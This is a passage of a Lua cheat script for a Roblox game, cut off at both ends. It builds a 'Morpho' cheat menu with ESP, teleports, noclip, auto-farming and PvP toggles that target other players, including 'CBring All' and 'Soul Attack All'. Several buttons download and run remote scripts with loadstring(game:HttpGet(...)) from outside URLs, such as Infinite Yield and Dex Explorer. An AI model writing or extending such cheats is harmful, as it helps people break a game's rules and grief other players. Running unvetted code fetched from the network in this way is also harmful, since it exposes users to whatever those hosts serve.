                    Position = UDim2.fromOffset(0, -15),
                    Size = UDim2.fromScale(1, 10),
                    Font = "GothamBold",
                    TextColor3 = Color3.new(1, 1, 1),
                    TextSize = 14,
                    TextStrokeTransparency = 0.5,
                    Visible = Globals.PlayersData.Esp[Player.Name] and true or false,
                }),
            }),
        })
    end)
end

local function CreateHighlight(Player)
    task.spawn(function()
        InstanceUtility:Create("Highlight", {
            Name = Player.Name,
            FillTransparency = 0.5,
            FillColor = GameUtility:UpdateColor(Player:WaitForChild("leaderstats"):WaitForChild("Status").Value, HeroFolder, VillainFolder, Globals.Titles),
            OutlineColor = GameUtility:UpdateColor(Player:WaitForChild("leaderstats"):WaitForChild("Status").Value, HeroFolder, VillainFolder, Globals.Titles),
            Enabled = false,
        }, HighlightsContainer)
    end)
end

Loading:SetCurrentStep(3)
Loading:SetMessage("Network Connection")
Loading:SetDescription("Establishing remote communication...")
task.wait(0.5)

Loading:ShowSidebarPage(true)
Loading.Sidebar:AddLabel("User: " .. LocalPlayer.Name)
Loading.Sidebar:AddLabel("Place ID: " .. PlaceIdentifier)
Loading.Sidebar:AddLabel("Executor: " .. InjectorName)
Loading.Sidebar:AddLabel("Version: " .. ScriptVersion)
task.wait(0.5)

Loading:SetCurrentStep(4)
Loading:SetMessage("Interface Loading")
Loading:SetDescription("Constructing user interface...")
task.wait(0.5)

local Window = Library:CreateWindow({
    Title = "Morpho",
    Icon = "square-parking",
    Footer = "Version: " .. ScriptVersion,
    NotifySide = "Right",
    ShowCustomCursor = false,
})

local Tabs = {
    Farm = { Tab = Window:AddTab("Farm & More", "pickaxe"), MenuGroups = {} },
    Visual = { Tab = Window:AddTab("Visual", "eye"), MenuGroups = {} },
    Usual = { Tab = Window:AddTab("Usual", "zap"), MenuGroups = {} },
    Pvp = { Tab = Window:AddTab("Pvp", "swords"), MenuGroups = {} },
    Teleports = { Tab = Window:AddTab("Teleports", "navigation"), MenuGroups = {} },
    Fun = { Tab = Window:AddTab("Fun", "balloon"), MenuGroups = {} },
    Settings = { Tab = Window:AddTab("Settings", "settings"), MenuGroups = {} },
    UiSettings = { Tab = Window:AddTab("Ui Settings", "scan-eye"), MenuGroups = {} },
}

Tabs.UiSettings.MenuGroups.Left = Tabs.UiSettings.Tab:AddLeftGroupbox("Menu", "wrench")
local MenuGroups = {
    UiGroup = Tabs.UiSettings.MenuGroups.Left,
}

MenuGroups.UiGroup:AddToggle("KeybindMenuOpen", {
    Default = Library.KeybindFrame.Visible,
    Text = "Keybind Menu",
    Callback = function(Value)
        Library.KeybindFrame.Visible = Value
    end,
})

MenuGroups.UiGroup:AddToggle("ShowCustomCursor", {
    Text = "Custom Cursor",
    Default = false,
    Callback = function(Value)
        Library.ShowCustomCursor = Value
    end,
})

MenuGroups.UiGroup:AddDropdown("NotificationSide", {
    Values = { "Left", "Right" },
    Default = "Right",
    Text = "Notification Side",
    Callback = function(Value)
        Library:SetNotifySide(Value)
    end,
})

MenuGroups.UiGroup:AddDropdown("DPIDropdown", {
    Values = { "50%", "75%", "100%", "125%", "150%", "175%", "200%" },
    Default = "100%",
    Text = "DPI Scale",
    Callback = function(Value)
        Value = Value:gsub("%%", "")
        Library:SetDPIScale(tonumber(Value))
    end,
})

MenuGroups.UiGroup:AddDivider()
MenuGroups.UiGroup:AddLabel("Menu bind"):AddKeyPicker("MenuKeybind", {
    Default = "H",
    NoUI = true,
    Text = "Menu keybind",
})

MenuGroups.UiGroup:AddButton("Unload", function()
    Library:Unload()
end)

Library.ToggleKeybind = Options.MenuKeybind

local FarmLeft = Tabs.Farm.Tab:AddLeftGroupbox("Farming", "pickaxe")
local FarmRight = Tabs.Farm.Tab:AddRightGroupbox("Settings", "settings")

FarmLeft:AddToggle("FistStrength", {
    Text = "Fist Strength",
    Default = false,
})

FarmLeft:AddToggle("BodyToughness", {
    Text = "Body Toughness",
    Default = false,
})

FarmLeft:AddToggle("PsychicPower", {
    Text = "Psychic Power",
    Default = false,
})

FarmLeft:AddToggle("JumpForceMovementSpeed", {
    Text = "Jump Force & Movement Speed",
    Default = false,
})

FarmLeft:AddToggle("ScreenOptimization", {
    Text = "Screen Optimization",
    Default = false,
})

FarmLeft:AddToggle("SafeMode", {
    Text = "Safe Mode",
    Default = false,
})

FarmRight:AddSlider("RespawnHealth", {
    Text = "Respawn Health",
    Default = 50,
    Min = 0,
    Max = 99,
    Rounding = 0,
    Suffix = "%",
})

FarmRight:AddToggle("StatsCounter", {
    Text = "Stats Counter",
    Default = false,
})

local VisualLeft = Tabs.Visual.Tab:AddLeftGroupbox("Player Visuals", "eye")
local VisualRight = Tabs.Visual.Tab:AddRightGroupbox("World Visuals", "sun")

VisualLeft:AddToggle("Esp", {
    Text = "ESP",
    Default = false,
})

VisualLeft:AddToggle("Highlights", {
    Text = "Highlights",
    Default = false,
})

VisualRight:AddSlider("Time", {
    Text = "Time",
    Default = 12,
    Min = 0,
    Max = 23,
    Rounding = 0,
})

VisualRight:AddButton({
    Text = "Better Atmosphere",
    Func = function()
        for _, Object in LightingService:GetChildren() do
            if Object.Name ~= "Blur" then
                Object:Destroy()
            end
        end
        InstanceUtility:Create("Sky", {
            CelestialBodiesShown = false,
            SkyboxBk = "http://www.roblox.com/asset/?id=151165214",
            SkyboxDn = "http://www.roblox.com/asset/?id=151165197",
            SkyboxFt = "http://www.roblox.com/asset/?id=151165224",
            SkyboxLf = "http://www.roblox.com/asset/?id=151165191",
            SkyboxRt = "http://www.roblox.com/asset/?id=151165206",
            SkyboxUp = "http://www.roblox.com/asset/?id=151165227",
            SunAngularSize = 10,
        }, LightingService)
        InstanceUtility:Create("BloomEffect", { Intensity = 0.3, Size = 10, Threshold = 0.8 }, LightingService)
        InstanceUtility:Create("ColorCorrectionEffect", { Brightness = 0.1, Contrast = 0.5, Saturation = -0.3, TintColor = Color3.fromRGB(255, 235, 203) }, LightingService)
        InstanceUtility:Create("SunRaysEffect", { Intensity = 0.075, Spread = 0.727 }, LightingService)
        InstanceUtility:Create("Atmosphere", { Density = 0.364, Offset = 0.556, Color = Color3.fromRGB(199, 175, 166), Decay = Color3.fromRGB(44, 39, 33), Glare = 0.36, Haze = 1.72 }, LightingService)
        LightingService.Ambient = Color3.fromRGB(2, 2, 2)
        LightingService.Brightness = 2.25
        LightingService.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
        LightingService.ColorShift_Top = Color3.fromRGB(0, 0, 0)
        LightingService.EnvironmentDiffuseScale = 0.2
        LightingService.EnvironmentSpecularScale = 0.2
        LightingService.GlobalShadows = true
        LightingService.OutdoorAmbient = Color3.fromRGB(0, 0, 0)
        LightingService.ShadowSoftness = 0.2
        LightingService.GeographicLatitude = 45
        LightingService.ExposureCompensation = 0.5
    end,
})

VisualRight:AddButton({
    Text = "Leaderboards On Spawn",
    Func = function()
        local Positions = { CFrame.new(359, 252, 830), CFrame.new(359, 252, 810), CFrame.new(359, 252, 790), CFrame.new(359, 264, 830), CFrame.new(359, 264, 810) }
        local PositionIndex = 1
        for _, Object in WorkspaceService.Leaderboards:GetChildren() do
            if Object:IsA("Part") and Object.Name:match("LeaderBoardPart") then
                if Positions[PositionIndex] then
                    Object:PivotTo(Positions[PositionIndex])
                    Object.Orientation = Vector3.new(0, 90, 0)
                    Object.Size = Vector3.new(20, 12, 2)
                    Object.Material = Enum.Material.ForceField
                    Object.CanCollide = false
                    PositionIndex = PositionIndex + 1
                else
                    break
                end
            end
        end
    end,
})

VisualRight:AddButton({
    Text = "Black Menu",
    Func = function()
        for _, ButtonName in { "LootBoxBtn", "InvBtn" } do
            if MenuFrame:FindFirstChild(ButtonName) then
                MenuFrame[ButtonName]:Destroy()
            end
        end
        MenuFrame.BackgroundTransparency = 1
        MenuFrame.InfoFrame.BackgroundTransparency = 0.1
        MenuFrame.InfoFrame.BackgroundColor3 = Color3.new(0.04, 0.04, 0.04)
        for _, FrameName in { "SkillFrame", "GangFrame", "SpecialFrame", "SettingFrame", "SquadFrame" } do
            if MenuFrame:FindFirstChild(FrameName) then
                MenuFrame[FrameName].BackgroundColor3 = Color3.new(0.04, 0.04, 0.04)
                if FrameName == "SquadFrame" then
                    for _, Child in MenuFrame[FrameName]:GetChildren() do
                        if Child:IsA("Frame") then
                            Child.BackgroundColor3 = Color3.new(0.04, 0.04, 0.04)
                        end
                    end
                end
            end
        end
        for _, TextName in { "NameTxt", "RankTxt", "StatusTxt", "KilledTxt", "MSTxt", "JFTxt", "RepTxt" } do
            if MenuFrame.InfoFrame:FindFirstChild(TextName) then
                MenuFrame.InfoFrame[TextName].TextColor3 = Color3.new(1, 1, 1)
            end
        end
        for Prefix, Color in { FS = Color3.new(1, 0.35, 0.35), BT = Color3.new(0.99, 0.36, 0.24), PP = Color3.new(0.32, 0.62, 0.98) } do
            if MenuFrame.InfoFrame:FindFirstChild(Prefix .. "Txt") then
                MenuFrame.InfoFrame[Prefix .. "Txt"].TextColor3 = Color
            end
        end
        local Configs = {
            { Name = "InfoBtn", Text = "Stats", Size = UDim2.new(0.2, 0, 0.07, 0), Position = UDim2.new(0, 0, 0.01, 0) },
            { Name = "SkillBtn", Text = "Skills", Size = UDim2.new(0.2, 0, 0.07, 0), Position = UDim2.new(0.2, 0, 0.01, 0) },
            { Name = "SquadBtn", Text = "Squad", Size = UDim2.new(0.2, 0, 0.07, 0), Position = UDim2.new(0.4, 0, 0.01, 0) },
            { Name = "SpecialBtn", Text = "Shop", Size = UDim2.new(0.2, 0, 0.07, 0), Position = UDim2.new(0.6, 0, 0.01, 0) },
            { Name = "SettingBtn", Text = "Settings", Size = UDim2.new(0.2, 0, 0.07, 0), Position = UDim2.new(0.8, 0, 0.01, 0) },
        }
        for _, Config in Configs do
            if MenuFrame:FindFirstChild(Config.Name) then
                MenuFrame[Config.Name].Text = Config.Text
                MenuFrame[Config.Name].Size = Config.Size
                MenuFrame[Config.Name].Position = Config.Position
            end
        end
        if MenuFrame:FindFirstChild("CloseBtn") then
            MenuFrame.CloseBtn.TextScaled = false
            MenuFrame.CloseBtn.TextColor3 = Color3.new(0.04, 0.04, 0.04)
            MenuFrame.CloseBtn.TextSize = 33
        end
        if MenuFrame.InfoFrame:FindFirstChild("RankImgBtn") then
            MenuFrame.InfoFrame.RankImgBtn.Image = PlayersService:GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
            InstanceUtility:Create("UICorner", { CornerRadius = UDim.new(1, 0) }, MenuFrame.InfoFrame.RankImgBtn)
            InstanceUtility:Create("UIStroke", { Color = Color3.new(0.39, 0.39, 0.39), Thickness = 2.5 }, MenuFrame.InfoFrame.RankImgBtn)
        end
        for _, Name in { "GuideImg", "GuideTxt" } do
            if MenuFrame.InfoFrame:FindFirstChild(Name) then
                MenuFrame.InfoFrame[Name].Visible = false
            end
        end
        if ScreenGui:FindFirstChild("MenuBtn") then
            ScreenGui.MenuBtn.BackgroundColor3 = Color3.new(0.04, 0.04, 0.04)
            ScreenGui.MenuBtn.BorderColor3 = Color3.new(0, 0, 0)
            ScreenGui.MenuBtn.TextColor3 = Color3.new(0, 0, 0)
        end
        if ScreenGui:FindFirstChild("CurrentGemImgBtn") then
            ScreenGui.CurrentGemImgBtn.ImageColor3 = Color3.new(0, 0, 0)
            if ScreenGui.CurrentGemImgBtn:FindFirstChild("AmountTxtBtn") then
                ScreenGui.CurrentGemImgBtn.AmountTxtBtn.TextColor3 = Color3.new(0.04, 0.04, 0.04)
                ScreenGui.CurrentGemImgBtn.AmountTxtBtn.TextStrokeColor3 = Color3.new(0, 0, 0)
            end
        end
        for Index = 1, 14 do
            if MenuFrame.SkillFrame:FindFirstChild("SkillTxt" .. Index) then
                MenuFrame.SkillFrame["SkillTxt" .. Index].TextColor3 = Color3.new(0.29, 0.76, 0.27)
            end
        end
        for Index = 0, 36 do
            if MenuFrame.SettingFrame:FindFirstChild("SettingTxt" .. Index) then
                MenuFrame.SettingFrame["SettingTxt" .. Index].TextColor3 = Color3.new(0.29, 0.76, 0.27)
            end
        end
        for _, FrameName in { "MainQuestFrame", "DailyQuestFrame", "SpecialQuestFrame", "WeeklyQuestFrame" } do
            if ScreenGui:FindFirstChild(FrameName) then
                local QuestFrame = ScreenGui[FrameName]
                QuestFrame.BackgroundColor3 = Color3.new(0.04, 0.04, 0.04)
                QuestFrame.BorderColor3 = Color3.new(0, 0, 0)
                QuestFrame.ScrollBarImageColor3 = Color3.new(0, 0, 0)
                QuestFrame.ScrollBarThickness = 12
                for _, Navigation in { "LeftBtn", "RightBtn" } do
                    if QuestFrame:FindFirstChild(Navigation) then
                        QuestFrame[Navigation].BackgroundColor3 = Color3.new(0.04, 0.04, 0.04)
                    end
                end
                if QuestFrame:FindFirstChild("HeaderTxt1") then
                    QuestFrame.HeaderTxt1.BackgroundColor3 = Color3.new(0.04, 0.04, 0.04)
                    QuestFrame.HeaderTxt1.TextColor3 = Color3.new(0, 0, 0)
                end
                for Index = 1, 9 do
                    if QuestFrame:FindFirstChild("MaxFrame" .. Index) then
                        QuestFrame["MaxFrame" .. Index].BackgroundColor3 = Color3.new(0.04, 0.04, 0.04)
                        local Reward = QuestFrame["MaxFrame" .. Index]:FindFirstChild("RewardTxt")
                        if Reward and Reward:FindFirstChild("GemImgBtn") then
                            local Gem = Reward.GemImgBtn
                            Gem.ImageColor3 = Color3.new(0, 0, 0)
                            if Gem:FindFirstChild("AmountTxt") then
                                Gem.AmountTxt.TextColor3 = Color3.new(0.04, 0.04, 0.04)
                                Gem.AmountTxt.TextStrokeColor3 = Color3.new(0, 0, 0)
                            end
                        end
                    end
                end
            end
        end
    end,
})

VisualRight:AddButton({
    Text = "Black Map",
    Func = function()
        local Objects = {
            { WorkspaceService.Map.WhiteLists.Misc.Floor.Grass, "Children" },
            { WorkspaceService.Map.Decorations.Town:GetChildren()[5502], "Color" },
            { WorkspaceService.Map.Decorations.Town:GetChildren()[7792], "Color" },
            { WorkspaceService.Map.Decorations.Town:GetChildren()[5488], "Color" },
            { WorkspaceService.Map.Decorations.Town:GetChildren()[5781], "Color" },
            { WorkspaceService.Map.Decorations.Town:GetChildren()[4664], "Color" },
            { WorkspaceService.Map.Decorations.Town:GetChildren()[3503], "Color" },
            { WorkspaceService.Map.Decorations.Town:GetChildren()[5776], "Color" },
            { WorkspaceService.Map.WhiteLists.Misc.Floor.Road, "Road" },
            { WorkspaceService.Map.Decorations.NewTree, "Descendants" },
            { WorkspaceService.Map.WhiteLists.Misc.Floor.Concrete, "Concrete" },
            { WorkspaceService.Map.Training_Decorations.BodyToughness, "Descendants" },
            { WorkspaceService.Map.WhiteLists.Misc.Floor.OceanFloor, "Children" },
            { WorkspaceService.Map.Training_Decorations.FistStrength, "Descendants" },
            { WorkspaceService.Map.Respawns["1"], "Descendants" },
            { WorkspaceService.Map.TrainingArea, "Descendants" },
            { WorkspaceService.Map.Training_Decorations.PsychicPower, "Descendants" },
            { WorkspaceService.Terrain, "Terrain" },
        }
        for _, Data in Objects do
            local Object, Property = Data[1], Data[2]
            if Object and Property then
                if Property == "Children" then
                    for _, Child in Object:GetChildren() do
                        if Child:IsA("BasePart") then
                            Child.Color = Color3.new(0, 0, 0)
                            if Child.Name == "Union" then
                                Child.UsePartColor = true
                            end
                        end
                    end
                elseif Property == "Descendants" then
                    for _, Descendant in Object:GetDescendants() do
                        if Descendant:IsA("BasePart") then
                            Descendant.Color = Color3.new(0, 0, 0)
                            if Descendant.Name == "Union" then
                                Descendant.UsePartColor = true
                            end
                        end
                    end
                elseif Property == "Color" then
                    if Object:IsA("BasePart") then
                        Object.Color = Color3.new(0, 0, 0)
                    end
                elseif Property == "Road" then
                    for _, Child in Object:GetChildren() do
                        if Child:IsA("BasePart") then
                            Child.Color = Color3.new(0, 0, 0)
                            Child.Material = "Cobblestone"
                            if Child.Name == "Union" then
                                Child.UsePartColor = true
                            end
                        end
                    end
                elseif Property == "Concrete" then
                    for _, Child in Object:GetChildren() do
                        if Child:IsA("BasePart") then
                            Child.Color = Color3.new(0, 0, 0)
                            Child.Material = "Basalt"
                            if Child.Name == "Union" then
                                Child.UsePartColor = true
                            end
                        end
                    end
                elseif Property == "Terrain" then
                    Object.Color = Color3.new(0, 0, 0)
                    Object.WaterColor = Color3.new(0, 0, 0)
                end
            end
        end
    end,
})

local UsualLeft = Tabs.Usual.Tab:AddLeftGroupbox("Features", "zap")
local UsualRight = Tabs.Usual.Tab:AddRightGroupbox("Settings", "settings")

UsualLeft:AddToggle("AutoDisableAura", {
    Text = "Auto Disable Aura",
    Default = false,
})

UsualLeft:AddToggle("AutoClaimQuests", {
    Text = "Auto Claim Quests",
    Default = false,
})

UsualLeft:AddToggle("AutoCompleteQuests", {
    Text = "Auto Complete Quests",
    Default = false,
})

UsualLeft:AddToggle("AntiKillingIntentAura", {
    Text = "Anti Killing Intent Aura",
    Default = false,
})

UsualLeft:AddButton({
    Text = "Fast Teleport",
    Func = function()
        UserInputService.InputBegan:Connect(function(Input, GameProcessed)
            if GameProcessed then
                return
            end
            if Input.KeyCode == Enum.KeyCode.V then
                if LocalPlayer:GetMouse().Target and GameUtility:IsAlive(LocalPlayer) then
                    local RootPart = LocalPlayer.Character.Humanoid.RootPart
                    local HitPos = LocalPlayer:GetMouse().Hit
                    RootPart:PivotTo(RootPart:GetPivot() - (RootPart.Position - Vector3.new(HitPos.X, HitPos.Y + 5, HitPos.Z)))
                end
            end
        end)
    end,
})

UsualRight:AddDropdown("Animations", {
    Values = { "None", "Astronaut", "Bubbly", "Cartoony", "Elder", "Knight", "Levitation", "Mage", "Ninja", "Pirate", "Robot", "Rthro", "Stylish", "Superhero", "Toy", "Vampire", "Werewolf", "Zombie" },
    Default = 1,
    Text = "Animations",
    Func = function()
        NetworkUtility:FireServer("RemoteEvent", { "Respawn" })
    end
})

UsualRight:AddSlider("Fov", {
    Text = "FOV",
    Default = 70,
    Min = 1,
    Max = 120,
    Rounding = 0,
})

local PvpLeft = Tabs.Pvp.Tab:AddLeftGroupbox("Targets", "crosshair")
local PvpLeftF = Tabs.Pvp.Tab:AddLeftGroupbox("All Players", "users")
local PvpRight = Tabs.Pvp.Tab:AddRightGroupbox("Combat", "swords")

PvpLeft:AddInput("Targets", {
    Text = "Targets",
    Placeholder = "Nickname",
    Default = "",
})

PvpLeft:AddButton({
    Text = "Add To Whitelist",
    Func = function()
        if PlayersService:FindFirstChild(Globals.PlayersData.CurrentTarget) and PlayersService:FindFirstChild(Globals.PlayersData.CurrentTarget) ~= LocalPlayer then
            if ListUtility:AddToList(Globals.PlayersData.Whitelisted, Globals.PlayersData.CurrentTarget) then
                Library:Notify({ Title = "Added to Whitelist", Description = Globals.PlayersData.CurrentTarget, Time = 3 })
            end
        end
        Library:Notify({ Title = "Whitelisted", Description = table.concat(Globals.PlayersData.Whitelisted, ", "), Time = 3 })
    end,
})

PvpLeft:AddButton({
    Text = "Remove From Whitelist",
    Func = function()
        ListUtility:RemoveFromList(Globals.PlayersData.Whitelisted, Globals.PlayersData.CurrentTarget)
        Library:Notify({ Title = "Whitelisted", Description = table.concat(Globals.PlayersData.Whitelisted, ", "), Time = 3 })
    end,
})

PvpLeft:AddButton({
    Text = "Clear Whitelist",
    Func = function()
        ListUtility:ClearList(Globals.PlayersData.Whitelisted)
        Library:Notify({ Title = "Whitelisted", Description = table.concat(Globals.PlayersData.Whitelisted, ", "), Time = 3 })
    end,
})

PvpLeft:AddButton({
    Text = "Add To Targets",
    Func = function()
        if PlayersService:FindFirstChild(Globals.PlayersData.CurrentTarget) and PlayersService:FindFirstChild(Globals.PlayersData.CurrentTarget) ~= LocalPlayer then
            if ListUtility:AddToList(Globals.PlayersData.Targets, Globals.PlayersData.CurrentTarget) then
                Library:Notify({ Title = "Added to Targets", Description = Globals.PlayersData.CurrentTarget, Time = 3 })
            end
        end
        Library:Notify({ Title = "Targets", Description = table.concat(Globals.PlayersData.Targets, ", "), Time = 3 })
    end,
})

PvpLeft:AddButton({
    Text = "Remove From Targets",
    Func = function()
        ListUtility:RemoveFromList(Globals.PlayersData.Targets, Globals.PlayersData.CurrentTarget)
        Library:Notify({ Title = "Targets", Description = table.concat(Globals.PlayersData.Targets, ", "), Time = 3 })
    end,
})

PvpLeft:AddButton({
    Text = "Clear Targets",
    Func = function()
        ListUtility:ClearList(Globals.PlayersData.Targets)
        Library:Notify({ Title = "Targets", Description = table.concat(Globals.PlayersData.Targets, ", "), Time = 3 })
    end,
})

PvpLeft:AddButton({
    Text = "Teleport To Target",
    Func = function()
        for _, Target in Globals.PlayersData.Targets do
            if GameUtility:IsAlive(LocalPlayer) and GameUtility:IsAlive(PlayersService:FindFirstChild(Target)) then
                LocalPlayer.Character.Humanoid.RootPart:PivotTo(PlayersService:FindFirstChild(Target).Character.Humanoid.RootPart:GetPivot())
            end
        end
    end,
})

PvpRight:AddToggle("CBring", { Text = "CBring", Default = false })
PvpRight:AddToggle("SpamPunch", { Text = "Spam Punch", Default = false })
PvpRight:AddToggle("SpamSphere", { Text = "Spam Sphere", Default = false })
PvpRight:AddToggle("Stack", { Text = "Stack", Default = false })
PvpRight:AddToggle("Spectate", { Text = "Spectate", Default = false })
PvpRight:AddToggle("SoulAttack", { Text = "Soul Attack", Default = false })
PvpRight:AddToggle("SoulReap", { Text = "Soul Reap", Default = false })
PvpRight:AddToggle("HellFire", { Text = "Hell Fire", Default = false })
PvpRight:AddToggle("LoopTeleport", { Text = "Loop Teleport", Default = false })
PvpRight:AddToggle("SitOnHead", { Text = "Sit On Head", Default = false })

PvpLeftF:AddToggle("CBringAll", { Text = "CBring All", Default = false })
PvpLeftF:AddToggle("StackAll", { Text = "Stack All", Default = false })
PvpLeftF:AddToggle("SoulAttackAll", { Text = "Soul Attack All", Default = false })
PvpLeftF:AddToggle("HellFireAll", { Text = "Hell Fire All", Default = false })
PvpLeftF:AddToggle("SoulReapAll", { Text = "Soul Reap All", Default = false })

local TeleportsLeft = Tabs.Teleports.Tab:AddLeftGroupbox("Teleports", "navigation")
local TeleportsRight = Tabs.Teleports.Tab:AddRightGroupbox("Settings", "settings")

TeleportsLeft:AddDropdown("Locations", {
    Values = Globals.TeleportSystem.Options,
    Default = "SafeZone",
    Text = "Locations",
})

TeleportsLeft:AddButton({
    Text = "Teleport To Location",
    Func = function()
        if GameUtility:IsAlive(LocalPlayer) then
            LocalPlayer.Character.Humanoid.RootPart:PivotTo(Globals.TeleportSystem.Locations[Options.Locations.Value])
        end
    end,
})

TeleportsRight:AddToggle("LoopTeleportToLocation", {
    Text = "Loop Teleport To Location",
    Default = false,
})

local FunLeft = Tabs.Fun.Tab:AddLeftGroupbox("Spam", "zap")
local FunLeftF = Tabs.Fun.Tab:AddLeftGroupbox("Rainbow", "palette")
local FunRight = Tabs.Fun.Tab:AddRightGroupbox("Custom", "palette")
local FunRightF = Tabs.Fun.Tab:AddRightGroupbox("Physics", "move")

FunLeft:AddToggle("SpamAura", { Text = "Spam Aura", Default = false })
FunLeft:AddToggle("SpamInvisibility", { Text = "Spam Invisibility", Default = false })
FunLeft:AddToggle("SpamKillingIntentAura", { Text = "Spam Killing Intent Aura", Default = false })
FunLeft:AddButton({
    Text = "Ball",
    Func = function()
        if GameUtility:IsAlive(LocalPlayer) and not Framework.Runtime.Connections.BallConnection and not Framework.Runtime.Connections.BallJumpConnection then
            for _, Object in LocalPlayer.Character:GetChildren() do
                if Object:IsA("BasePart") then
                    Object.CanCollide = false
                end
            end
            local RootPart = LocalPlayer.Character.Humanoid.RootPart
            RootPart.Shape = Enum.PartType.Ball
            RootPart.Size = Vector3.new(5, 5, 5)
            RootPart.CanCollide = true
            LocalPlayer.Character.Humanoid.PlatformStand = true
            Camera.CameraSubject = RootPart
            local RayParams = RaycastParams.new()
            RayParams.FilterType = Enum.RaycastFilterType.Exclude
            RayParams.FilterDescendantsInstances = { LocalPlayer.Character }
            Framework.Runtime.Connections.BallConnection = RunService.PostSimulation:Connect(function(Delta)
                if LocalPlayer.Character.Humanoid.Health <= 0 then
                    return
                end
                if UserInputService:IsKeyDown(Enum.KeyCode.W) then
                    RootPart.AssemblyAngularVelocity -= Camera.CFrame.RightVector * 30 * Delta
                end
                if UserInputService:IsKeyDown(Enum.KeyCode.A) then
                    RootPart.AssemblyAngularVelocity -= Camera.CFrame.LookVector * 30 * Delta
                end
                if UserInputService:IsKeyDown(Enum.KeyCode.S) then
                    RootPart.AssemblyAngularVelocity += Camera.CFrame.RightVector * 30 * Delta
                end
                if UserInputService:IsKeyDown(Enum.KeyCode.D) then
                    RootPart.AssemblyAngularVelocity += Camera.CFrame.LookVector * 30 * Delta
                end
            end)
            Framework.Runtime.Connections.BallJumpConnection = UserInputService.JumpRequest:Connect(function()
                if LocalPlayer.Character.Humanoid.Health <= 0 then
                    return
                end
                local RayDistance = (RootPart.Size.Y / 2) + 0.5
                local RaycastResult = WorkspaceService:Raycast(RootPart.Position, Vector3.new(0, -RayDistance, 0), RayParams)
                if RaycastResult then
                    RootPart.AssemblyLinearVelocity += Vector3.new(0, 60, 0)
                end
            end)
        end
    end,
})

FunLeftF:AddToggle("RainbowRank", { Text = "Rainbow Rank", Default = false })
FunLeftF:AddToggle("RainbowWeight", { Text = "Rainbow Weight", Default = false })
FunLeftF:AddToggle("RainbowSpheres", { Text = "Rainbow Spheres", Default = false })
FunLeftF:AddToggle("RainbowLasers", { Text = "Rainbow Lasers", Default = false })
FunLeftF:AddToggle("RainbowAura", { Text = "Rainbow Aura", Default = false })
FunLeftF:AddToggle("RainbowNames", { Text = "Rainbow Names", Default = false })

FunRight:AddLabel("Custom Color"):AddColorPicker("CustomColor", { Default = Color3.new(0, 0, 0), Title = "Custom Color" })
FunRight:AddToggle("CustomSpheres", { Text = "Custom Spheres", Default = false })
FunRight:AddToggle("CustomLasers", { Text = "Custom Lasers", Default = false })
FunRight:AddToggle("CustomAura", { Text = "Custom Aura", Default = false })
FunRight:AddToggle("CustomNames", { Text = "Custom Names", Default = false })

FunRightF:AddToggle("Noclip", { Text = "Noclip", Default = false })
FunRightF:AddToggle("Spin", { Text = "Spin", Default = false })
FunRightF:AddToggle("Gravity", { Text = "Gravity", Default = false })
FunRightF:AddSlider("SpinSpeed", { Text = "Spin Speed", Default = 250, Min = 0, Max = 1000, Rounding = 0 })
FunRightF:AddSlider("GravityValue", { Text = "Gravity Value", Default = 250, Min = 0, Max = 1000, Rounding = 0 })

local SettingsLeft = Tabs.Settings.Tab:AddLeftGroupbox("Settings", "settings")
local SettingsRight = Tabs.Settings.Tab:AddRightGroupbox("Utilities", "wrench")

SettingsLeft:AddDropdown("Logs", {
    Values = { "Dead", "Joined/Left" },
    Default = { Dead = true, ["Joined/Left"] = true },
    Multi = true,
    Text = "Logs",
})

SettingsLeft:AddDropdown("TypeOfLogs", {
    Values = { "Chat", "Notify", "Console" },
    Default = { Chat = true },
    Multi = true,
    Text = "Type Of Logs",
})

SettingsLeft:AddLabel("Panic Key"):AddKeyPicker("PanicKeybind", {
    Default = "Y",
    Text = "Panic Key",
})

SettingsLeft:AddLabel("Respawn"):AddKeyPicker("RespawnKeybind", {
    Default = "F1",
    Text = "Respawn",
})

SettingsRight:AddSlider("FpsCap", {
    Text = "FPS Cap",
    Default = 60,
    Min = 0,
    Max = 240,
    Rounding = 0,
})

SettingsRight:AddButton({
    Text = "FPS Booster",
    Func = function()
        local SuccessCount = 0
        for _, Object in game:GetDescendants() do
            local Success = pcall(function()
                if Object:IsA("BasePart") then
                    Object.Material = "Plastic"
                    Object.Reflectance = 0
                end
                if Object:IsA("ParticleEmitter") then
                    Object.Enabled = false
                    Object.Lifetime = NumberRange.new(0)
                end
                if Object:IsA("Light") or Object:IsA("PointLight") or Object:IsA("SurfaceGui") then
                    Object.Enabled = false
                end
            end)
            if Success then
                SuccessCount = SuccessCount + 1
            end
        end
        for _, Effect in LightingService:GetChildren() do
            pcall(function()
                if Effect:IsA("Light") or Effect:IsA("PostEffect") then
                    Effect.Enabled = false
                end
            end)
        end
        Library:Notify({ Title = "FPS Boosted", Description = "Optimized " .. SuccessCount .. " objects", Time = 3 })
    end,
})

SettingsRight:AddButton({
    Text = "Infinite Yield",
    Func = function()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        end)
    end,
})

SettingsRight:AddButton({
    Text = "Dex Explorer",
    Func = function()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/tIoxp/better-dex/refs/heads/main/dex.luau"))()
        end)
    end,
})

SettingsRight:AddButton({
    Text = "Sirius",
    Func = function()
        pcall(function()
            loadstring(game:HttpGet("https://sirius.menu/sirius"))()
        end)
    end,
})

SettingsRight:AddButton({
    Text = "Reconnect",
    Func = function()
        if setfpscap then
            setfpscap(Options.FpsCap.Value)
        end
        TeleportService:TeleportToPlaceInstance(PlaceIdentifier, JobIdentifier, LocalPlayer)
    end,
})

SettingsRight:AddButton({
    Text = "Leave",
    Func = function()
        game:Shutdown()
    end,
})

SettingsRight:AddButton({
    Text = "Job ID",
    Func = function()
        Library:Notify({ Title = "Job ID", Description = "Copied to your clipboard!", Time = 3 })
        setclipboard(JobIdentifier)
    end,
})

SettingsRight:AddButton({
    Text = "Discord",
    Func = function()
        Library:Notify({ Title = "Discord", Description = "Copied to your clipboard!", Time = 3 })
        setclipboard("https://discord.gg/x7gt2yqHpx")
    end,
})

Loading:SetCurrentStep(5)
Loading:SetMessage("Loading Functions")
Loading:SetDescription("Registering feature handlers...")
task.wait(0.7)

do
    Toggles.FistStrength:OnChanged(function()
        if Framework.Runtime.Connections.FistStrength then
            Framework.Runtime.Connections.FistStrength:Disconnect()
            Framework.Runtime.Connections.FistStrength = nil
        end
